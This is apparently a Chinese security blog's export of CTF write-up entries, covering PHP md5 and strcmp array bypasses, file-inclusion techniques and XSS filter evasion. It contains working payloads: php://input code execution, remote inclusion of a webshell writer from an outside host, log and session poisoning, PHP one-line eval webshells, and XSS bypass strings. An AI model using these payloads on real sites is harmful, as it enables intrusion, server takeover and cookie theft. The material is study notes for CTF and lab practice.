str_replace(find,replace,string,count)find必需。规定要查找的值。replace必需。规定替换 find 中的值的值。string必需。规定被搜索的字符串。count可选。一个变量，对替换数进行计数。 echo str_replace(“world”,”John”,”Hello world!”); 将world替换为John输出：Hello John!该函数对大小写敏感。请使用 str_ireplace() 执行对大小写不敏感的搜索。 parse_str() 函数把查询字符串解析到变量中。parse_str(“name=Peter&amp;age=43”);echo $name;echo $age;输出：Peter 43 MD5碰撞题目代码的意思就是ip地址之后从？开始的值，然后变为第一位之后的值，删掉?。由echo语句可知变量中有key1和key2，但是$str中遇到key就替换为空，由于替换只执行一次，所以双写就可以绕过，之后MD5碰撞构造payload：http://123.206.87.240:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2，就可以拿到flag。当 md5接受的数据为数组时就会返回null，两值相等。 strcmpstrcmp(str1,str2)如果str1小于str2返回-1，str1=str2返回0，str1&gt;str2返回1，if(！strcmp($a,$b)),要求a与b中值相等。strcmp()在比较字符串和数组的时候直接返回0a[]=1&amp;b[]=1 flag在index里文件包含漏洞(基础知识选自https://blog.csdn.net/qq_41007744/article/)PHP包含php中提供四个文件包含的函数，分别是include(),include_once(),require()和require_once()。 这四个都可以进行文件包含，但有区别 require找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本include找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行include_once:此语句和include雷系，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含require_once 此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含 1.使用PHP封装协议file_get_contents内部可以使用php伪协议PHP带有很多内置的URL风格的封装协议，，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似。 file:// 访问本地文件系统http:// 访问HTTP(s)网址php:// 访问输入/输出流zlib:// 压缩流data:// 数据ssh2:// Secure Shell 2expect:// 处理交互式的流 glob:// 查找匹配的文件路径 使用封装协议读取PHP文件 使用PHP封装协议内置封装协议可以读取PHP文件。 (1)http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=xxxx.php 得到base64加密的php源码 (2)写入php文件 使用php://input执行php语句，但使用这条语句时需要注意: php://input受限于allow_url_include(on)。 构造URL: http://www.xxser.com/index.php?page=php://input, 并且提交数据为: &lt;?php system (‘net user’);?&gt; 如果提交&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[‘xxser’]);?&gt;”)?&gt;将会在index.php所在目录下生成shell.php 2.包含截断当文件名会被强制添加时使用%00截断，php中不会显示%00后面的内容，这种方法只适用于magic_quotes_gpc=Off时，开启时%00会被转义。 3. 远程包含Shell如果目标主机的allow_url_fopen是激活的，就可以尝试远程包含一句话木马，如: http://www.2cto.com/echo.txt 代码如下: &lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval ($_POST[x]);?&gt;”)?&gt;访问: http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt, 将会在Index.php所在的目录下生成shell.php 4.本地包含配合文件上传很多网站通常会提供文件上传的功能，比如:上传头像、文档等。假设已经上传一句话图片木马到服务器，路径为: /uploadfile/201363.jpg 图片代码如下: &lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[x]);?&gt;”)?&gt;访问URL: http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg, 包含这张图片，将会在Index.php所在的目录中生成shell.php 5.包含日志文件Apache运行后一般默认生成两个日志文件，一个是access.log和error.log，Apache访问日志文件记录了客户端的每次请求及服务器响应的相关信息，例如，当我们请求Index.php时，Apache就会记录我们的操作，并且写到访问日志文件access.log中 当访问一个不存在的资源时，Apache日志同样会记录 这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL: http://www.xxser.com/&lt;?php phpinfo();?&gt;.Apache会记录请求”&lt;?php phpinfo();?&gt;” 并写到accsee.log文件中，这时再去包含Apache的日志文件，就可以利用包含漏洞。 但实际是不可行的，因为在访问URL后一句话木马在日志文件里变形了 127.0.0.1 - - [04/Jun/2013:15:04:22 +0800] “GET /%3C?php%20phpinfo();)?%3E HTTP/1.1” 403 291 PHP代码中的”&lt;,&gt;,空格”都被浏览器转码了，这样就无法利用Apache包含漏洞。 但可以通过Burp绕过编码 再利用accsee去包含accsee.log，即可成功执行其中的PHP代码 在使用Apache日志文件包含时，首先需要确定Apache的日志路径，否则即使攻击者将PHP写入日志文件，也无法包含常见几个路径：/var/log/apache/access_log/var/www/logs/access_log/var/log/access_log 原文链接：https://blog.csdn.net/qq_41007744/article/ 6.包含session文件session中的内容可以被控制，传入恶意代码。session的存储位置可以获取。1.通过phpinfo的信息可以获取到session的存储位置。2.通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存 php一句话木马查看php的shell信息：&lt;?php phpinfo();exit;?&gt;eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;&lt;?php @eval($_POST[‘c’]);?&gt; NCTF Web题‘基本操作’复现登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;” 留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22) 列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss跨站脚本攻击]]></title>
    <url>%2F2018%2F12%2F01%2Fxss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-1%2F</url>
    <content type="text"><![CDATA[XSS (Reflected)用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码low难度没有任何过滤直接 alert(‘xss’)就可以得到弹窗，medium难度加了str_replace，high难度加了preg_replace，这两个函数有什么区别呢？搜索一波， str_replace（）：定义和用法 str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是数组，那么它将返回数组。如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。注释：该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索。 (1)大小写绕过&lt; sCript&gt;(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;（原文：https://blog.csdn.net/caoyouming0609/article/details/75208002） preg_replace（）：.： 匹配除“\n”之外的任何单个字符。*： 匹配前面的子表达式零次或多次。所以&lt; script&gt;标签不可用，&lt; img src=”javascript:alert(‘xss’);”&gt;也不可用，我们无法依靠属性值进行跨站，但可以产生自己的事件&lt; img src=”1” onerror=alert(‘xss’)&gt; onerror是IMG标记的一个事件，只要页面发生错误，该事件立即被激活，语句中浏览器解释IMG标记时，会加载src属性引用的图片地址，该图片不存在则触发onerror事件。 盗取cookie(咕~)]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
</search>
